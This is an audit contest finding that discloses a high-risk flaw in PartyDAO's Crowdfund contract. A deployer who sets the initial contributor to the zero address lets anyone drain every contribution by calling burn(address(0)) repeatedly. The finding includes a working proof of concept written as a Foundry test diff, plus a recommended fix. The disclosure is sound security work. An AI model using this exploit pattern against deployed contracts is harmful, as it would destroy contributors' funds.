## Tags

- bug
- 3 (High Risk)
- high quality report
- resolved
- sponsor confirmed

# [Possibility to burn all ETH in Crowdfund under some circumstances](https://github.com/code-423n4/2022-09-party-findings/issues/105) 

# Lines of code

https://github.com/PartyDAO/party-contracts-c4/blob/3896577b8f0fa16cba129dc2867aba786b730c1b/contracts/crowdfund/Crowdfund.sol#L147


# Vulnerability details

## Impact
If `opts.initialContributor` is set to `address(0)` (and `opts.initialDelegate` is not), there are two problems:
1.) If the crowdfund succeeds, the initial balance will be lost. It is still accredited to `address(0)`, but it is not retrievable. 
2.) If the crowdfund does not succeed, anyone can completely drain the contract by repeatedly calling `burn` with `address(0)`. This will always succeed because `CrowdfundNFT._burn` can be called multiple times for `address(0)`. Every call will cause the initial balance to be burned (transferred to `address(0)`).

Issue 1 is somewhat problematic, but issue 2 is very problematic, because all funds of a crowdfund are burned and an attacker can specifically set up such a deployment (and the user would not notice anything special, after all these are parameters that the protocol accepts).

## Proof Of Concept
This diff illustrates scenario 2, i.e. where a malicious deployer burns all contributions (1 ETH) of `contributor`. He loses 0.25ETH for the attack, but this could be reduced significantly (with more `burn(payable(address(0)))` calls:

```diff
--- a/sol-tests/crowdfund/BuyCrowdfund.t.sol
+++ b/sol-tests/crowdfund/BuyCrowdfund.t.sol
@@ -36,9 +36,9 @@ contract BuyCrowdfundTest is Test, TestUtils {
     string defaultSymbol = 'PBID';
     uint40 defaultDuration = 60 * 60;
     uint96 defaultMaxPrice = 10e18;
-    address payable defaultSplitRecipient = payable(0);
+    address payable defaultSplitRecipient = payable(address(this));
     uint16 defaultSplitBps = 0.1e4;
-    address defaultInitialDelegate;
+    address defaultInitialDelegate = address(this);
     IGateKeeper defaultGateKeeper;
     bytes12 defaultGateKeeperId;
     Crowdfund.FixedGovernanceOpts defaultGovernanceOpts;
@@ -78,7 +78,7 @@ contract BuyCrowdfundTest is Test, TestUtils {
                     maximumPrice: defaultMaxPrice,
                     splitRecipient: defaultSplitRecipient,
                     splitBps: defaultSplitBps,
-                    initialContributor: address(this),
+                    initialContributor: address(0),
                     initialDelegate: defaultInitialDelegate,
                     gateKeeper: defaultGateKeeper,
                     gateKeeperId: defaultGateKeeperId,
@@ -111,40 +111,26 @@ contract BuyCrowdfundTest is Test, TestUtils {
     function testHappyPath() public {
         uint256 tokenId = erc721Vault.mint();
         // Create a BuyCrowdfund instance.
-        BuyCrowdfund pb = _createCrowdfund(tokenId, 0);
+        BuyCrowdfund pb = _createCrowdfund(tokenId, 0.25e18);
         // Contribute and delegate.
         address payable contributor = _randomAddress();
         address delegate = _randomAddress();
         vm.deal(contributor, 1e18);
         vm.prank(contributor);
         pb.contribute{ value: contributor.balance }(delegate, "");
-        // Buy the token.
-        vm.expectEmit(false, false, false, true);
-        emit MockPartyFactoryCreateParty(
-            address(pb),
-            address(pb),
-            _createExpectedPartyOptions(0.5e18),
-            _toERC721Array(erc721Vault.token()),
-            _toUint256Array(tokenId)
-        );
-        Party party_ = pb.buy(
-            payable(address(erc721Vault)),
-            0.5e18,
-            abi.encodeCall(erc721Vault.claim, (tokenId)),
-            defaultGovernanceOpts
-        );
-        assertEq(address(party), address(party_));
-        // Burn contributor's NFT, mock minting governance tokens and returning
-        // unused contribution.
-        vm.expectEmit(false, false, false, true);
-        emit MockMint(
-            address(pb),
-            contributor,
-            0.5e18,
-            delegate
-        );
-        pb.burn(contributor);
-        assertEq(contributor.balance, 0.5e18);
+        vm.warp(block.timestamp + defaultDuration + 1);
+        // The auction was not won, we can now burn all ETH from contributor...
+        assertEq(address(pb).balance, 1.25e18);
+        pb.burn(payable(address(0)));
+        assertEq(address(pb).balance, 1e18);
+        pb.burn(payable(address(0)));
+        assertEq(address(pb).balance, 0.75e18);
+        pb.burn(payable(address(0)));
+        assertEq(address(pb).balance, 0.5e18);
+        pb.burn(payable(address(0)));
+        assertEq(address(pb).balance, 0.25e18);
+        pb.burn(payable(address(0)));
+        assertEq(address(pb).balance, 0);
```

## Recommended Mitigation Steps
Do not allow an initial contribution when `opts.initialContributor` is not set.